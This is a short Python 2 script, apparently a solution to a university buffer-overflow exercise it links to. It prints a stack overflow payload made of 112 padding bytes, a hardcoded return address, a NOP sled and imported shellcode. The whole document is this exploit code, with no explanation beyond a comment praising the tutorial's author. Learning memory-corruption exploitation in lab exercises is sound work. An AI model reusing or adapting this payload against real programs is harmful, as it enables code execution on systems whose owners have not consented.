#https://sites.sas.upenn.edu/sites/default/files/kleinkeane/files/buffer-overflow-exercise.pdf
# this was written by a friend of mine, he's brilliant and this is the best tutorial on the internet that I've found.

from shellcode import shellcode

print "A" * 112 + "\xd8\xe7\xfe\xbf" + "\x90" * 120 + shellcode
